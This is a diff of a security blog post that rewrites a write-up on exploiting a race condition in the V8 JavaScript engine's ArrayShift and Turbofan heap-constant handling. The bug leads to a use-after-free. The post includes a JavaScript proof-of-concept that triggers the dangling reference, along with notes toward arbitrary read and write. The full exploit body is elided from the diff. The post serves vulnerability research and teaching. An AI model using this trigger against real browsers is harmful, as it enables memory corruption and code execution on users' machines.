@@ -5,77 +5,82 @@ draft: false
 tags: ["browser", "v8"]
 ---
 
-Getting a double reference from the main thread and the turbofan thread to create a confusion. Thereby giving us a dangling pointer and UAF.
+In this post, we’ll explore how to exploit a race condition in the V8 JavaScript engine, leading to a dangling pointer and a Use-After-Free (UAF) vulnerability. 
 <!--more-->
+This occurs when we create double references from both the main thread and the Turbofan thread, which can confuse the memory management system.
 
-## Analysis:
-- Builtins, ArrayShift:
-    - remove the first element in the array and move the entire array left by 1. Free's the elements pointer and reallocates it.
-    
-- ReduceElementLoadFromHeapConstant():
-    - When a value is being used continuously, it gets optimized to be used as a constant untill the cow array is changed.
-    - tl;dr creates a reference to the element.
 
-## Bug:
-- When the turbofan thread does `ReduceElementLoadFromHeapConstant` it creates a reference to the array's element. Parallelly the main thread excecutes the shift prototype which will cause the reference to point to a free region in heap.
-- Race: 
-    -> turbofan - readuce heap constant
-        ---     time gap    ---
-    -> runtime 
+## Analysis
 
+### Builtins: ArrayShift
+The `ArrayShift` method removes the first element from an array and shifts the entire array to the left by one index. This process frees the elements' pointer and reallocates it, potentially leading to memory corruption if not handled properly.
+
+### Creating Constant  
+> ReduceElementLoadFromHeapConstant()
+When a value is frequently accessed, V8 optimizes it by treating it as a constant until the underlying array (Copy-On-Write or COW) changes. This optimization creates a reference to the element that can become problematic during concurrent operations.
+
+## The Bug
+The core issue arises when the Turbofan thread executes `ReduceElementLoadFromHeapConstant`, creating a reference to an array's element. Meanwhile, the main thread executes the `ArrayShift` prototype, which causes the reference to point to a freed memory region in the heap.
+
+### Race Condition
 ```c
-//  src/compiler/js-heap-broker.cc
+// src/compiler/js-heap-broker.cc
 return FixedArrayBaseRef(
-        broker(), broker()-&gt;CanonicalPersistentHandle(object()-&gt;elements()));
+        broker(), broker()->CanonicalPersistentHandle(object()->elements()));
 ```
-> Will give you the pointer to the elements fixed array. PS: Handles are tracked by the v8 GC.
+This line retrieves a pointer to the elements of the fixed array. Note that handles are tracked by V8's garbage collector (GC).
 
-- filler object will be put in the place of the first element, after an ArrayShit happens.
+After executing the `ArrayShift`, a filler object replaces the first element:
 ```c
-//  src/heap/heap.cc
+// src/heap/heap.cc
 CreateFillerObjectAt(old_start, bytes_to_trim,
                     MayContainRecordedSlots(object)
                         ? ClearRecordedSlots::kYes
                         : ClearRecordedSlots::kNo);
 ```
 
+### Memory State Example
+Here’s a glimpse of the memory layout after each shift operation:
+
 ```
 elements: 0x12fa08295ee1 <FixedArray[145]>
 elements: 0x12fa08295ee5 <FixedArray[144]> 
 elements: 0x12fa08295ee9 <FixedArray[143]>
-After each shift operation in memory.
 ```
 
-## POC:
-```js
+## Proof of Concept (PoC)
+Here’s a simple JavaScript function to demonstrate the vulnerability:
+
+```javascript
 function exploit() {
-    let bug_size = 120;
-    let push_obj = [6969];
+    let bugSize = 120;
+    let pushObj = [6969];
     let barr = [1.1];
 
-    for(let i=0;i<bug_size;i++){
-        barr.push(push_obj)
+    for (let i = 0; i < bugSize; i++) {
+        barr.push(pushObj);
     }
 
-    function dangling_ref() {
+    function danglingRef() {
+        barr.shift();                                       // Shift the array
+        for (let v19 = 0; v19 < 10000; v19++) {}            // Busy wait
+        let a = barr[0];                                    // Reference to freed element
 
-        barr.shift();
-        for (let v19 = 0; v19 < 10000; v19++) {}
-        let a = barr[0];
-
-        gc();
-        for (let v19 = 0; v19 < 500; v19++) {}
+        gc();                                               // Trigger garbage collection
+        for (let v19 = 0; v19 < 500; v19++) {}              // More busy wait
     }
+
     for (let i = 0; i < 4; i++) {
-        dangling_ref();
+        danglingRef();
     }
 }
-  
+
 exploit();
 ```
 
-## My Exploit:
-```js
+## Main Exploit Logic
+
+```javascript
 ///////////////////////////////////////////////////////////////////////
 ///////////////////         Utility Functions       ///////////////////
 ///////////////////////////////////////////////////////////////////////
@@ -344,15 +349,15 @@ function exploit() {
 }
 
 exploit();
-
 ```
 
-## Road-blocks:
-- The main object block is seprated from the elements block. Extremely far, can't change the elements pointer (below solution).
-- (spent wayy to much time) Finding a way to get arbitrary read. Never knew that a inline HeapNumber will be a pointer to a IEEE, Assumed it will be inlined.
-    - heap constant pool to save memory, I feel dumb.
-- typed arrays still have their backing store. easy full 64 bit write/ 64 bit value.
-- Had skill issue, and the struggle was real.
+### Roadblocks
 
-## Reference:
-- https://blog.exodusintel.com/2023/05/16/google-chrome-v8-arrayshift-race-condition-remote-code-execution/
+While working on this exploit, I encountered several challenges:
+1. **Separation of Main and Elements Blocks**: The main object block is significantly distanced from the elements block, complicating pointer manipulation.
+2. **Finding Arbitrary Read**: I initially struggled to find an effective way to achieve arbitrary read access, unaware that an inline `HeapNumber` would serve as a pointer to an IEEE format.
+3. **Typed Arrays**: Despite being challenging, I realized that typed arrays retain their backing store, allowing for straightforward 64-bit writes.
+4. **Skill Development**: This project was a steep learning curve, highlighting the complexities involved in exploitation.
+
+## References
+- [Exodus Intelligence Blog on V8 ArrayShift Race Condition](https://blog.exodusintel.com/2023/05/16/google-chrome-v8-arrayshift-race-condition-remote-code-execution/)
